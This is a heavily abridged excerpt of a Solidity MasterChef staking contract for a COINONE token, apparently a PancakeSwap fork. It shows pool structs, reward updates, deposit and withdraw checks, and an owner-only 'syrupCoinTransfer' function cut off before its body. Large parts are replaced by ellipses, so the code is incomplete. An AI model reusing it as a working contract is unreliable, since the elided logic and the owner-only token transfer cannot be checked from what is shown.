...
contract MasterChef is Ownable {
    ...
    struct UserInfo {
        ...
        //
        // We do some fancy math here. Basically, any point in time, the amount of COINONEs
    ...
    struct PoolInfo {
        ...
        uint256 allocPoint;       // How many allocation points assigned to this pool. COINONE to distribute per block.
        uint256 lastRewardBlock;  // Last block number that COINONE distribution occurs.
        uint256 accCakePerShare; // Accumulated COINONE per share, times 1e12. See below.
    }
    ...
    // Dev address.
    // COINONE tokens created per block.
    uint256 public cakePerBlock;
    // Bonus muliplier for early COINONE makers.
    ...
    // The block number when COINONE mining starts.
    ...
    function add(uint256 _allocPoint, IBEP20 _lpToken, bool _withUpdate) public onlyOwner {
        ...
        updateStakingPool();
        pooladdress[address(_lpToken)] = true;
    }

    // Update the given pool's COINONE allocation point. Can only be called by the owner.
    ...
    // View function to see pending  COINONEs on frontend.
    function pendingCake(uint256 _pid, address _user) validatePoolByPid(_pid) external view returns (uint256) {
    ...
    function updatePool(uint256 _pid) public validatePoolByPid(_pid){
        ...
        //cake._mint(address(syrup), cakeReward);
        pool.accCakePerShare = pool.accCakePerShare.add(cakeReward.mul(1e12).div(lpSupply));
        pool.lastRewardBlock = block.number;
    }

    // Deposit LP tokens to MasterChef for COINONE allocation.
    function deposit(uint256 _pid, uint256 _amount) public validatePoolByPid(_pid) {
     

        require (_pid != 0, 'deposit COINONE by staking');
    ...
    function withdraw(uint256 _pid, uint256 _amount) public validatePoolByPid(_pid){
        ...
        require (_pid != 0, 'withdraw COINONE by unstaking');
    ...
    // Stake COINONE tokens to MasterChef
    ...
    // Withdraw COINONE tokens from STAKING.
    ...
    function syrupCoinTransfer(address _to, uint256 _amount) public onlyOwner{
